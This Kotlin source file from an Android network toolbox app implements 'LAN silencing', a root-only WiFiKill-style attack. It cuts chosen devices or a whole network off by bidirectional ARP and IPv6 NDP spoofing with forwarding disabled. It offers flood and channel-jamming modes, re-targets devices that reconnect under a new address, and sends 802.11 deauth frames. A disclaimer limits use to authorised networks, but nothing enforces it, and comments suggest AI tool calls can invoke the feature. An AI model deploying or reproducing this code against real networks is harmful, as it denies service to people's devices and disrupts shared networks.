package com.installer.toolbox.core.network.scan

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * 全网静默 / 强制踢下线（Wi-Fi 杀手原理，需 root + 内置工具）。
 *
 * - [start]：对目标设备做 ARP 欺骗（内置 arpspoof 定向欺骗，宣称"网关 MAC = 手机"），
 *   目标流量被引到手机后**不转发**（ip_forward=0）→ 目标"断网但还连着 Wi-Fi"（静默），
 *   效果 = WiFiKill 的 ARP 阻断。单台传入一个 IP；全网传入全部在线设备 IP（排除本机与网关）。
 *   网络有 IPv6 时自动叠加 ndpspoof NDP 欺骗（[NdpSpoof] 双向三件套），对 IPv6 流量同样断网。
 *   静默**持续生效**，直到手动调用 [stop] 取消（取消时主动向目标发正确网关 ARP 应答，立即恢复）。
 * - [kick]：向目标设备发送 802.11 deauth 管理帧（内置 deauth），
 *   宣称"目标已与 AP 断开"→ 目标主动断开 Wi-Fi（强制踢下线）。注：部分芯片/驱动不支持
 *   应用层注入管理帧，效果因设备而异，无效时可改用静默。
 * - [stop]：先向全部被静默目标发送正确网关 ARP 应答（修正其 ARP 缓存，立即恢复网络），
 *   再杀掉 arpspoof/ndpspoof 进程。手动取消后目标即刻恢复，无自动恢复定时。
 *
 * 多网络适配：网关/接口解析走 [LanInterfaceResolver]（局域网接口优先）——PDA 有线底座（br0/eth0）
 * 与"局域网无外网、默认路由在移动数据"的场景都能正确解析，不再写死 wlan0、不误操作移动网卡。
 *
 * 免责与限制：
 * - 对启用 ARP 防火墙 / 静态绑定 / AP 隔离的设备静默无效（ARP 欺骗收不到）；
 * - **静默（ARP 欺骗）对有线和无线设备均有效**（ARP 是二层协议，不分介质，
 *   只要同处一个局域网广播域即可）；**踢下线（deauth）仅对 Wi-Fi 无线设备有效**，
 *   有线设备不受 802.11 管理帧影响（需拔网线或路由器禁用端口）；
 * - 仅限对自己拥有或已获明确授权的网络设备使用，法律责任由使用者承担。
 */
object LanSilencer {

    /** 免责声明（UI 强提示 + 结果 note 均携带） */
    const val LEGAL_NOTE =
        "免责声明：本功能使用 ARP 欺骗/802.11 踢下线技术，仅限对您自己拥有或已获明确授权的网络设备做装维排查；擅自对他人设备使用属违法行为，由此引发的全部法律责任由使用者自行承担。"

    /** ARP 防护限制提示 */
    const val ARP_GUARD_NOTE =
        "提示：静默采用**双向欺骗**（同时欺骗目标与网关）——目标即使启用 ARP 防火墙/忽略伪造应答，网关侧欺骗仍会截断其外网下行流量而断网；仅当路由器侧有静态绑定/ARP 防护（锁定 IP-MAC）或 AP 隔离阻断手机与目标通信时可能无效。静默只断外网（局域网互通不受影响），停止后目标约 1 分钟内自动恢复。"

    /** 操作结果 */
    data class SilenceResult(val ok: Boolean, val message: String)

    /** 进程内静默状态：目标 IP → 欺骗进程 PID 列表（2 arpspoof + 若干 ndpspoof） */
    private val activePids = java.util.concurrent.ConcurrentHashMap<String, MutableList<Int>>()

    /** 进程内静默目标记录：IP → 静默启动时的真实 MAC（重连侦测比对用） */
    private val activeMacs = java.util.concurrent.ConcurrentHashMap<String, String>()

    /** 进程内静默目标记录：IP → mDNS 主机名（重连换 IP 后靠它找回，跨重连不变） */
    private val activeHostnames = java.util.concurrent.ConcurrentHashMap<String, String>()

    /** 路由表 via 行：`8.8.8.8 via 192.168.100.1 dev wlan0 ...` */
    private val DEFAULT_VIA_RE = Regex("""via (\d{1,3}(?:\.\d{1,3}){3}) dev (\S+)""")

    /** MAC 地址格式 */
    private val MAC_RE = Regex("""([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}""")

    /** IPv4 格式校验（防 AI 工具参数把 shell 特殊字符拼进 root 命令） */
    private val IPV4_RE = Regex("""((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)""")

    /**
     * 解析局域网出口网关与接口（**局域网接口优先**，多网络适配）：
     * 先用 [LanInterfaceResolver] 枚举真实接口（wlan0/eth0/br0…，排除 rmnet 移动网卡）——
     * 局域网无外网、默认路由切到移动数据时也能拿到正确的局域网接口与网关；
     * 解析不到局域网接口时才回退旧逻辑（跟默认路由 `ip route get 8.8.8.8`）。
     */
    private fun resolveGateway(runner: ((String) -> String)?): Pair<String, String>? {
        val r = runner ?: return null
        val lan = try { LanInterfaceResolver.resolve(r) } catch (e: Exception) { null }
        if (lan != null) {
            if (lan.gateway != null) return lan.gateway to lan.name
            // 该接口没有 default via（纯二层/静态配置）→ 尝试默认路由（仅当其出口就是该接口）
            val route = r("ip route get 8.8.8.8")
            if (!route.startsWith("root 执行失败") && !route.startsWith("命令退出码")) {
                val via = DEFAULT_VIA_RE.find(route)
                if (via != null && via.groupValues[2] == lan.name) {
                    return via.groupValues[1] to lan.name
                }
            }
            return null
        }
        val route = r("ip route get 8.8.8.8")
        if (route.startsWith("root 执行失败") || route.startsWith("命令退出码")) return null
        val via = DEFAULT_VIA_RE.find(route) ?: return null
        return via.groupValues[1] to via.groupValues[2]
    }

    /**
     * 开始静默：对 [targets] 逐一后台启动 arpspoof 定向欺骗（网关 MAC = 手机），
     * 网络有 IPv6 时叠加 ndpspoof NDP 欺骗（[NdpSpoof] 双向三件套：目标侧断上行 + 网关侧断下行），
     * 并确保 ip_forward=0（流量引到手机后丢弃 → 目标断网）。
     *
     * @param gateway 网关 IP；null 时自动解析（失败返回错误）
     * @param mode 静默强度：standard（500ms 常规）/ flood（30ms 洪泛压制）/ jam（0ms 忙循环占满空口，信道阻塞，副作用大）
     * @param hostnames 目标 IP → mDNS 主机名（重连换 IP 后靠它找回目标；无主机名的设备换 IP 后无法自动找回）
     * @return 启动结果（含免责声明与限制提示）
     */
    suspend fun start(
        context: Context,
        rootRun: ((String) -> String)?,
        targets: List<String>,
        gateway: String? = null,
        mode: String = "standard",
        hostnames: Map<String, String> = emptyMap()
    ): SilenceResult = withContext(Dispatchers.IO) {
        if (rootRun == null) {
            return@withContext SilenceResult(false, "未检测到 root 权限：静默功能不可用（需 root + 内置 arpspoof）")
        }
        // 模式 → 发包间隔毫秒：standard=500（常规）/ flood=30（洪泛高频压制）/
        // jam=0（忙循环占满空口，信道阻塞）；未知模式回退 standard
        val intervalMs = when (mode) {
            "flood" -> 30
            "jam" -> 0
            else -> 500
        }
        if (targets.isEmpty()) {
            return@withContext SilenceResult(false, "没有可静默的目标设备")
        }
        val gwInfo = resolveGateway(rootRun)
        val gw = gateway ?: gwInfo?.first
        if (gw == null) {
            return@withContext SilenceResult(false, "无法解析网关：请确认已连接 Wi-Fi/有线网络且同一局域网（无外网的局域网也可，需 root）")
        }
        val iface = gwInfo?.second ?: "wlan0"
        // 清掉上次会话遗留的孤儿欺骗进程（App 被重装/强杀后进程仍在跑、占着二进制文件，
        // cp 覆盖会报 "Text file busy" 导致初始化失败）；跳过当前在管进程（第二次静默不误杀第一台）
        val trackedPids = activePids.values.flatten().toSet()
        listOf("toolbox_arpspoof", "toolbox_ndpspoof").forEach { name ->
            val leftover = try {
                rootRun("pidof $name || true")
            } catch (e: Exception) {
                ""
            }
            leftover.lineSequence()
                .mapNotNull { it.trim().toIntOrNull() }
                .filter { it !in trackedPids }
                .forEach { pid -> try { rootRun("kill -9 $pid") } catch (_: Exception) {} }
        }
        val arpspoofBin = BuiltinTools.arpspoof(context, rootRun)
            ?: return@withContext SilenceResult(false, "内置 arpspoof 初始化失败：无法静默")
        // 静默 = 不转发：目标流量引到手机后直接丢弃
        rootRun("sysctl -w net.ipv4.ip_forward=0")
        // 去重 + 排除网关 + **IPv4 格式校验**（防 AI 工具参数注入 shell 命令，root 执行）
        val ipList = targets.distinct().filter { it != gw && IPV4_RE.matches(it) }
        if (ipList.isEmpty()) {
            return@withContext SilenceResult(false, "没有合法的目标设备 IP（格式校验未通过）")
        }
        val started = mutableListOf<String>()
        var v6Started = 0
        val ndpspoofBin = BuiltinTools.ndpspoof(context, rootRun)
        ipList.forEach { ip ->
            // 双向 ARP 欺骗（WiFiKill 完整实现）：
            // ① 骗目标：告诉目标"网关 MAC = 手机" → 目标发往外网的流量被引到手机丢弃；
            // ② 骗网关：告诉网关"目标的 MAC = 手机" → 网关发往目标的下行流量被引到手机丢弃
            val pids = mutableListOf<Int>()
            for ((victim, spoofAs) in listOf(ip to gw, gw to ip)) {
                spawnRoot(
                    rootRun,
                    "sh -c '${arpspoofBin} $iface $victim $spoofAs - $intervalMs >/dev/null 2>&1 & echo pid=\$!'",
                    pids
                )
            }
            // IPv6 NDP 欺骗（双向三件套，共享 NdpSpoof；纯 IPv4 网络自动跳过）
            val vMac = NdpSpoof.victimMac(rootRun, ip)
            if (vMac != null) activeMacs[ip] = vMac
            hostnames[ip]?.let { if (it.isNotBlank()) activeHostnames[ip] = it }
            if (ndpspoofBin != null) {
                val v6Res = NdpSpoof.spoofTarget(rootRun, ndpspoofBin, iface, gw, ip, intervalMs, pids)
                if (v6Res.victimMac != null) activeMacs[ip] = v6Res.victimMac
                if (v6Res.v6Procs > 0) v6Started++
            }
            if (pids.isNotEmpty()) {
                activePids[ip] = pids
                started += ip
            }
        }
        if (started.isEmpty()) {
            SilenceResult(false, "静默启动失败：请检查 root 授权与网络状态（AP 隔离/静态绑定会静默无效）")
        } else {
            val modeText = when (mode) {
                "flood" -> "洪泛模式：高频压制，对标准档断不掉的顽固设备更狠，可能影响同网段其他设备"
                "jam" -> "信道阻塞模式：忙循环占满空口压制最狠，对付断一下又恢复的设备，可能让同 Wi-Fi 其他设备一起卡，仅限授权测试"
                else -> "标准模式：双向 ARP+IPv6 欺骗（多数设备够用）"
            }
            val ipv6Text = if (v6Started > 0) {
                "，已启用 IPv6 双重断网（NDP 欺骗，${v6Started} 台）"
            } else {
                "（IPv6 欺骗未启用：无 IPv6 网络或目标无 v6 地址）"
            }
            SilenceResult(
                true,
                "已静默 ${started.size} 台设备：${started.joinToString("、")}（网关与手机自身不受影响）。$modeText$ipv6Text。" +
                    "$LEGAL_NOTE$ARP_GUARD_NOTE"
            )
        }
    }

    /** 后台启动一个 root 进程并解析 PID 加入 [pids]；成功返回 1，失败返回 0 */
    private fun spawnRoot(rootRun: (String) -> String, cmd: String, pids: MutableList<Int>): Int {
        val out = try {
            rootRun(cmd)
        } catch (e: Exception) {
            return 0
        }
        return out.lineSequence()
            .mapNotNull { it.trim().removePrefix("pid=").toIntOrNull() }
            .firstOrNull()
            ?.let { pids += it; 1 } ?: 0
    }

    /** 杀掉 [ip] 的静默进程并清理记录（重连续静默 / 停止前调用） */
    private fun killTarget(rootRun: (String) -> String, ip: String) {
        activePids.remove(ip)?.forEach { pid -> try { rootRun("kill -9 $pid") } catch (_: Exception) {} }
        activeMacs.remove(ip)
        activeHostnames.remove(ip)
    }

    /** refresh 结果：重连后自动续静默成功的 IP（可能已换新 IP）与无法找回的 IP */
    data class RefreshResult(val reSilenced: List<String>, val lost: List<String>)

    /**
     * 重连侦测 + 自动续静默（静默期间周期性调用，如每 5 秒）。
     *
     * 逐台比对当前 MAC 与静默启动时记录的 MAC：
     * - MAC 变化（同 IP 重连）→ 杀旧进程、按新 MAC 重新静默该 IP；
     * - IP 消失（目标离线或换 IP）→ 用 [resolveNewIp]（按 mDNS 主机名全网扫描）找回新 IP 后重新静默；
     *   没有主机名记录或找不到 → 记为 lost（目标恢复网络后需手动重新静默）。
     */
    suspend fun refresh(
        context: Context,
        rootRun: ((String) -> String)?,
        targets: List<String>,
        mode: String = "standard",
        resolveNewIp: suspend (hostname: String) -> String? = { null }
    ): RefreshResult = withContext(Dispatchers.IO) {
        if (rootRun == null || targets.isEmpty()) return@withContext RefreshResult(emptyList(), emptyList())
        val reSilenced = mutableListOf<String>()
        val lost = mutableListOf<String>()
        targets.distinct().forEach { ip ->
            val recordedMac = activeMacs[ip] ?: return@forEach // 非本进程启动或从未解析到 MAC：跳过
            if (!activePids.containsKey(ip)) return@forEach // 已被停止：跳过
            val curMac = NdpSpoof.victimMac(rootRun, ip)
            when {
                curMac == null -> {
                    // IP 消失：目标离线或换 IP —— 靠主机名找回
                    if (!activePids.containsKey(ip)) return@forEach // 扫描期间可能已被用户停止
                    val host = activeHostnames[ip]
                    val newIp = host?.let { runCatching { resolveNewIp(it) }.getOrNull() }
                    if (newIp != null && IPV4_RE.matches(newIp) && newIp != ip) {
                        if (!activePids.containsKey(ip)) return@forEach // 同上：已停止则不再续
                        killTarget(rootRun, ip)
                        if (silenceOne(context, rootRun, newIp, mode, host)) {
                            reSilenced += "$ip→$newIp"
                        } else {
                            lost += ip
                        }
                    } else {
                        lost += ip
                    }
                }
                curMac != recordedMac -> {
                    // 同 IP 换 MAC（重连后 IP 未变）：杀旧进程、按新 MAC 重新静默
                    killTarget(rootRun, ip)
                    val host = activeHostnames[ip]
                    if (silenceOne(context, rootRun, ip, mode, host)) reSilenced += ip else lost += ip
                }
            }
        }
        RefreshResult(reSilenced, lost)
    }

    /**
     * 静默单台（start 的内部单元，refresh 重连续静默复用）：
     * 双向 ARP 欺骗 + [NdpSpoof] IPv6 双向欺骗。
     * @return 是否成功启动（至少 1 个进程）；失败返回 false
     */
    private suspend fun silenceOne(
        context: Context,
        rootRun: (String) -> String,
        ip: String,
        mode: String,
        hostname: String? = null
    ): Boolean = withContext(Dispatchers.IO) {
        val intervalMs = when (mode) {
            "flood" -> 30
            "jam" -> 0
            else -> 500
        }
        val gwInfo = resolveGateway(rootRun) ?: return@withContext false
        val gw = gwInfo.first
        val iface = gwInfo.second
        if (gw == ip) return@withContext false
        val arpspoofBin = BuiltinTools.arpspoof(context, rootRun) ?: return@withContext false
        val ndpspoofBin = BuiltinTools.ndpspoof(context, rootRun)

        val pids = mutableListOf<Int>()
        for ((victim, spoofAs) in listOf(ip to gw, gw to ip)) {
            spawnRoot(rootRun, "sh -c '$arpspoofBin $iface $victim $spoofAs - $intervalMs >/dev/null 2>&1 & echo pid=\$!'", pids)
        }
        val vMac = NdpSpoof.victimMac(rootRun, ip)
        if (vMac != null) activeMacs[ip] = vMac
        hostname?.let { if (it.isNotBlank()) activeHostnames[ip] = it }
        if (ndpspoofBin != null) {
            NdpSpoof.spoofTarget(rootRun, ndpspoofBin, iface, gw, ip, intervalMs, pids)
        }
        if (pids.isNotEmpty()) {
            activePids[ip] = pids
            true
        } else {
            false
        }
    }

    /**
     * 停止静默（手动取消，立即恢复）：先向被静默目标**双向**发送正确 ARP 应答
     * （恢复目标与网关两侧的真实 MAC 映射，双方立即刷新缓存恢复网络），再杀掉全部
     * arpspoof/ndpspoof 进程（kill 记录的 PID + pidof 兜底）。IPv6 侧不做主动恢复——
     * NDP 缓存过期后由真网关的周期 Router Advertisement 自动恢复（通常 30 秒内）。
     */
    suspend fun stop(
        context: Context,
        rootRun: ((String) -> String)?,
        targets: List<String>
    ): String = withContext(Dispatchers.IO) {
        val runner = rootRun ?: return@withContext "未检测到 root 权限，无法停止静默"
        // 1) 双向恢复帧：目标侧（网关真实 MAC）+ 网关侧（目标真实 MAC），两侧立即修正 ARP 缓存
        val silentTargets = targets.distinct()
        if (silentTargets.isNotEmpty()) {
            val gwInfo = resolveGateway(runner)
            val gw = gwInfo?.first
            val iface = gwInfo?.second ?: "wlan0"
            if (gw != null) {
                val gwMac = ipMac(runner, gw)
                val bin = BuiltinTools.arpspoof(context, runner)
                if (bin != null) {
                    silentTargets.forEach { ip ->
                        // 恢复目标侧：告诉目标"网关 = 网关真实 MAC"（后台 5 秒持续发，立即返回）
                        if (gwMac != null) {
                            runner("sh -c 'timeout 5 $bin $iface $ip $gw $gwMac >/dev/null 2>&1 &'")
                        }
                        // 恢复网关侧：告诉网关"目标 = 目标真实 MAC"（同样后台并行）
                        val targetMac = ipMac(runner, ip)
                        if (targetMac != null) {
                            runner("sh -c 'timeout 5 $bin $iface $gw $ip $targetMac >/dev/null 2>&1 &'")
                        }
                    }
                }
            }
        }
        // 2) 清理：先 kill 记录的 PID，再 pidof 兜底杀残留（pidof 按进程名精确匹配）
        silentTargets.forEach { ip ->
            activePids.remove(ip)?.forEach { pid -> runner("kill -9 $pid") }
            activeMacs.remove(ip)
            activeHostnames.remove(ip)
        }
        listOf("toolbox_arpspoof", "toolbox_ndpspoof").forEach { name ->
            val leftover = runner("pidof $name || true")
            leftover.lineSequence()
                .mapNotNull { it.trim().toIntOrNull() }
                .forEach { pid -> runner("kill -9 $pid") }
        }
        runner("sysctl -w net.ipv4.ip_forward=0")
        "已停止静默：已向目标设备（含网关侧）发送正确的网关信息，网络立即恢复。$LEGAL_NOTE"
    }

    /** 从 /proc/net/arp 查指定 IP 的真实 MAC（放宽：非全零 MAC 即用） */
    private fun ipMac(runner: (String) -> String, ip: String): String? {
        val arp = runner("cat /proc/net/arp")
        if (arp.startsWith("root 执行失败") || arp.startsWith("命令退出码")) return null
        arp.lineSequence().forEach { line ->
            val f = line.trim().split(Regex("\\s+"))
            if (f.size >= 4 && f[0] == ip && MAC_RE.matches(f[3]) &&
                !f[3].equals("00:00:00:00:00:00", ignoreCase = true)
            ) {
                return f[3]
            }
        }
        return null
    }

    /** 是否正在静默（进程内记录 + pidof 校验；pidof 按进程名精确匹配） */
    fun isSilencing(rootRun: ((String) -> String)?): Boolean {
        if (activePids.isNotEmpty()) return true
        val r = rootRun ?: return false
        val out = r("pidof toolbox_arpspoof || true")
        if (out.startsWith("root 执行失败") || out.startsWith("命令退出码")) return false
        return out.lines().any { it.trim().isNotEmpty() && it.trim().all { c -> c.isDigit() } }
    }

    /** 当前被静默的目标 IP 列表（进程内记录） */
    fun silencedTargets(): List<String> = activePids.keys.toList()

    /**
     * 强制踢下线：向目标设备发送 802.11 deauth 管理帧，让它认为自己已与 AP 断开而主动断联。
     *
     * @param targetMac 目标设备 MAC（需先从设备列表/ARP 表取得）
     * @param bssid 目标设备所连 AP 的 BSSID（目标必须连在当前 AP 才有效）
     * @param frames 发送帧数（默认 30，每帧间隔 100ms ≈ 3 秒）
     */
    suspend fun kick(
        context: Context,
        rootRun: ((String) -> String)?,
        targetMac: String,
        bssid: String,
        frames: Int = 30
    ): String = withContext(Dispatchers.IO) {
        if (rootRun == null) {
            return@withContext "未检测到 root 权限：踢下线功能不可用（需 root + 内置 deauth）"
        }
        val bin = BuiltinTools.deauth(context, rootRun)
            ?: return@withContext "内置 deauth 初始化失败：无法踢下线"
        val iface = resolveGateway(rootRun)?.second ?: "wlan0"
        val out = rootRun("$bin $iface $targetMac $bssid $frames 100")
        if (out.startsWith("root 执行失败") || out.startsWith("命令退出码")) {
            "踢下线执行失败：$out"
        } else {
            "已向设备 $targetMac 发送 $frames 帧断开指令。注意：**绝大多数 Android 手机的 Wi-Fi 芯片/驱动会丢弃应用层注入的 802.11 管理帧**（命令执行成功但帧未真正发出，实测向目标或网关发送均不掉线），若设备未掉线请改用『静默』（ARP 欺骗断外网，已验证有效）。$LEGAL_NOTE"
        }
    }
}
